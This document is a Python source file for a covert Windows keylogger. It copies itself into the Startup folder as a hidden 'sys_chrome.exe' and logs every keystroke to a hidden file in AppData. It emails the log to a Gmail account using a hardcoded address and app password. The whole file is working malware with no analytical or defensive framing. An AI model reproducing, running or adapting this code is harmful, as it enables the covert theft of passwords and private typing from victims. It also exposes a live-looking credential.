from pynput.keyboard import Listener
import re, os, shutil

fileLog = os.environ['appdata']+'\\sys.txt'

# ****************************** clone ******************************
clone_path = os.path.join(os.environ['APPDATA'], r'Microsoft\Windows\Start Menu\Programs\Startup')
file = 'sys_chrome.exe'
destination_file = os.path.join(clone_path, file)
try:
    shutil.copy(file, clone_path)
    os.system(f'attrib +h "{destination_file}"')
except Exception:
    pass
# ****************************** clone ******************************

# ****************************** email sender ******************************
import smtplib
from email import encoders
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

# ********* creating datetime*********
from datetime import datetime as dt
today = dt.now()
today_str = today.strftime("%Y-%m-%d %H:%M:%S")
# ************************************

port = 587
subject = today_str
body = 'The computer has just been turned on.'
smtp_server = 'smtp.gmail.com'
sender_email = 'dadosneurais@gmail.com'
receiver_email = 'dadosneurais@gmail.com'
password = 'juyxildtrkthhhpc'
def send_email():

    if not os.path.exists(fileLog):
        return
    else:
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver_email
        msg['Subject'] = subject

        msg.attach(MIMEText(body, 'plain'))
        with open(fileLog, 'rb') as f:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(f.read())


            encoders.encode_base64(part)

            part.add_header('Content-Disposition', f'attachment; filename = keykey.txt')
            msg.attach(part)
            with smtplib.SMTP(smtp_server, port) as s:
                s.starttls()
                s.login(sender_email, password)
                s.sendmail(sender_email, receiver_email, msg.as_string())
send_email()
# **************************************************************************

buffer=[]
def keyboard(k): # k is the keyboard types

    global buffer

    k = str(k)
    k = re.sub(r'\'', '', k)
    k = re.sub('Key.delete', ' Delete', k)
    k = re.sub('Key.space', ' ', k)
    k = re.sub('Key.esc', '', k)
    k = re.sub('Key.alt', '', k)
    k = re.sub('Key.ctrl', '', k)
    k = re.sub('Key.shift', '', k)
    k = re.sub('Key.enter', ' Enter ', k)
    k = re.sub('Key.backspace', ' ', k)
    k = re.sub('Key.up', ' up ', k)
    k = re.sub('Key.down', ' down ', k)
    k = re.sub('Key.left', ' left ', k)
    k = re.sub('Key.right', ' right ', k)
    k = re.sub('Key.tab', ' Tab ', k)
    k = re.sub('Key.caps_lock', ' capslock ', k)
    k = re.sub('Key.cmd', ' botao_iniciar ', k)
    k = re.sub('Key.f1', ' f1 ', k)
    k = re.sub('Key.f2', ' f2 ', k)
    k = re.sub('Key.f3', ' f3 ', k)
    k = re.sub('Key.f4', ' f4 ', k)
    k = re.sub('Key.f5', ' f5 ', k)
    k = re.sub('Key.f6', ' f6 ', k)
    k = re.sub('Key.f7', ' f7 ', k)
    k = re.sub('Key.f8', ' f8 ', k)
    k = re.sub('Key.f9', ' f9 ', k)
    k = re.sub('Key.f10', ' f10 ', k)
    k = re.sub('Key.f11', ' f11 ', k)
    k = re.sub('Key.f12', ' f12 ', k)
    k = re.sub('<96>', '0', k)
    k = re.sub('<97>', '1', k)
    k = re.sub('<98>', '2', k)
    k = re.sub('<99>', '3', k)
    k = re.sub('<100>', '4', k)
    k = re.sub('<101>', '5', k)
    k = re.sub('<102>', '6', k)
    k = re.sub('<103>', '7', k)
    k = re.sub('<104>', '8', k)
    k = re.sub('<105>', '9', k)

    buffer.append(k)

    if len(buffer)>=30: 

        with open(fileLog, "a", encoding='utf-8') as log:
            log.write(''.join(buffer))
        os.system(f'attrib +h {fileLog}')
        buffer=[]

with Listener(on_press=keyboard) as l:
    l.join()